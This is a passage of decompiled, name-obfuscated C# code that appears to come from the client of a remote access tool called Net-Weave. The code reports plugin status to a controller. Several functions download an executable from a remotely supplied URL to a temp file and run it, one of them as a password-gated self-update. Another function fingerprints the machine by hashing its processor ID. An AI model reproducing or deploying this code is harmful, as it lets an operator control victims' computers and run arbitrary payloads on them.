				(val.get_StateObject() as Class6).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + ": Stopped");
			}
		}
		catch
		{
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class6).method_9(val.get_Name() + ": Started");
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class6 @class = iplugin_0.get_StateObject() as Class6;
				@class.method_7(new Class7(Class6.Enum0.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("PLUGIN ERROR - Name: {0}, Error: {1}", iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class6).method_9(iplugin_0.get_Name() + ": Error");
		}
	}

	private static void smethod_15(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class6).method_9(val.get_Name() + ": Executed");
			}
		}
		catch
		{
		}
	}

	private static void smethod_16(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class6).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class6).method_9("File Executed");
		}
		catch
		{
			(array[1] as Class6).method_9("Error Downloading File.");
		}
	}

	private static void smethod_17(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class12.smethod_1(Convert.FromBase64String(Class2.string_10), bool_0: false)))
		{
			(array[2] as Class6).method_9("Invalid password");
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class6).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class6).method_9("Updating");
			if (Class2.bool_0)
			{
				Class9.smethod_4();
			}
			(array[2] as Class6).method_10(bool_2: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class6).method_9("Error Updating");
		}
	}

	private static void smethod_18()
	{
		new Thread(smethod_19).Start();
	}

	private static void smethod_19()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("A Net-Weave client is running on this PC.\nPress OK to close the client.", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_20()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_21(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
